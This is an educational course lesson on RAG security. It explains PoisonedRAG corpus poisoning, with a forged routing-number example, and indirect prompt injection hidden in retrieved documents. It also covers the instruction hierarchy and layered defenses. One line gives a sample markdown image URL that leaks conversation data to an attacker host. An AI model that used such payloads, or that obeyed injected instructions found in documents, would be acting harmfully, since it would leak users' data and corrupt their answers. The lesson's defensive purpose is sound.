Access control from [lesson 30.1](/lessons/30-rag-security-privacy-and-governance/30.1-rag-access-control-and-tenant-isolation/) stops a caller from reading another tenant's files. It does nothing when an attacker writes malicious text into a document the caller *is* allowed to read: a public wiki page, a support ticket, a scraped web article, or a shared vendor PDF. Once that text lands in the retrieval index, two distinct threats activate at query time: **corpus poisoning** (corrupting factual answers) and **indirect prompt injection** (hijacking the model's behavior and tools).

## How PoisonedRAG corrupts a million-document index with five texts

Many engineers assume that a large knowledge base dilutes bad data naturally: five forged paragraphs inside 2,000,000 clean chunks sounds like a drop in the ocean. That intuition fails because RAG does not average over the whole corpus. It passes only the top $k$ retrieved chunks—typically $k = 5$—into the generator.

Zou et al. (2024) formalized this attack in **PoisonedRAG** by breaking every malicious document $d_{\text{adv}}$ into two parts that satisfy two simultaneous conditions for a target question $Q$ and attacker-chosen answer $A_{\text{adv}}$:

- **The retrieval condition:** A prefix $S$ crafted so the embedding of $d_{\text{adv}} = S \oplus I$ has higher similarity to $Q$ than clean documents do (in the simplest black-box variant, $S$ is the target question $Q$ itself).
- **The generation condition:** A fabricated body $I$ written so an LLM reading $d_{\text{adv}}$ confidently produces $A_{\text{adv}}$ as the answer.

Walk through a concrete retrieval calculation. Suppose a corpus contains $N = 2{,}000{,}000$ clean chunks, and the true document answering "What is the official bank routing number for Vendor X?" scores a cosine similarity of $0.82$ against the user's query. An attacker submits 5 public support comments or web pages containing the exact question text paired with a forged routing number, earning cosine similarities between $0.89$ and $0.93$. When the retriever returns top-$k$ with $k = 5$, all 5 slots go to the attacker's chunks. The attacker's share of the corpus is $5 / 2{,}000{,}000 = 0.00025\%$, yet their share of the LLM's context window is $100\%$:

$$
\text{Context Share} = \frac{|\{d \in \text{Top-}k(Q) : d \in D_{\text{adv}}\}|}{k} = \frac{5}{5} = 1.0.
$$

In Zou et al.'s experiments across Natural Questions, HotpotQA, and MS-MARCO (millions of passages each), injecting just 5 poisoned texts per target question achieved a 90% attack success rate in black-box settings. Corpus size offers almost zero protection when anyone can write into an indexed source.

## Indirect prompt injection inside retrieved chunks

Corpus poisoning alters *what* the model believes; **indirect prompt injection**—introduced in [lesson 16.2](/lessons/16-agent-security-and-guardrails/16.2-indirect-prompt-injection/) and demonstrated against deployed web-connected assistants by Greshake et al. (2023)—alters *what the model does*. A retrieved document contains hidden instructions inside white-on-white PDF text, HTML comments, markdown alt attributes, or code comments telling the model to ignore developer rules, leak earlier conversation turns through a markdown image URL (`![x](https://attacker.invalid/leak?data=...)`), or invoke a connected tool.

This happens because a standard transformer flattens system instructions, user questions, and retrieved documents into one stream of tokens. Wallace et al. (2024) address the model-side half of this problem through **The Instruction Hierarchy**, training LLMs to treat privilege levels in strict descending order:

1. **System message** (highest privilege: developer policy and safety bounds).
2. **User message** (medium privilege: the authenticated caller's request).
3. **Tool outputs and retrieved documents** (lowest privilege: untrusted data, never executable instructions).

Instruction-hierarchy training measurably reduces indirect injection success, especially when combined with explicit structural boundaries (for example, placing retrieved chunks in dedicated `tool` or `<retrieved_context source_id="...">` blocks with stripped control characters). However, Wallace et al. also show that model-side hierarchy is probabilistic, not airtight: novel phrasing and strong adversarial suffixes still break through a non-zero fraction of the time.

## Layered defenses across ingestion, retrieval, and execution

Because neither embedding similarity nor prompt wording stops a determined attacker alone, production RAG systems distribute defense across three boundaries:

- **Write-path provenance and trust tiers:** Tag every indexed chunk with its origin (`signed_internal_doc`, `employee_wiki`, `customer_upload`, `public_web`). Never mix unverified external scrapes into the same trust tier as authoritative financial or operational runbooks. Scan ingested files for hidden text layers, invisible CSS, and anomalous directive patterns before indexing, and quarantine high-risk changes for review.
- **Retrieval diversity and corroboration:** Apply source deduplication so one author, domain, or newly created ticket cannot fill all $k$ slots. For high-stakes answers, require corroboration across independent trusted sources and use the abstention rules from [lesson 28.5](/lessons/28-production-rag-architectures/28.5-grounding-citations-abstention-and-graph-rag/) when retrieved chunks contradict each other.
- **Execution and rendering containment:** Strip or block external image rendering in markdown UIs so an injected `![tracker](...)` tag cannot exfiltrate context over HTTP GET requests. Keep RAG retrieval sessions read-only by default, and enforce any write or export tool call through deterministic runtime authorization and human approval outside the LLM.

:::caveat
Perplexity filters—which flag passages with unusually high language-model surprise—catch garbled optimization suffixes, but they miss fluent black-box PoisonedRAG payloads written in clean prose. Always pair content scanners with provenance tiers, source diversity caps, and deterministic runtime boundaries.
:::

## Detecting poisoning after deployment

Even strong ingestion filters miss clever attacks occasionally, so treat the index like a live database that needs continuous integrity monitoring. Log the exact `doc_id`, `source_tier`, and ingestion timestamp for every chunk that influences an answer. Alert when a single newly ingested document suddenly captures a disproportionate share of top-$k$ retrievals across unrelated users, or when answer outputs for canary monitoring queries drift after a corpus sync. Keeping immutable ingestion snapshots lets operators roll back a poisoned batch in minutes rather than rebuilding the entire index from scratch.
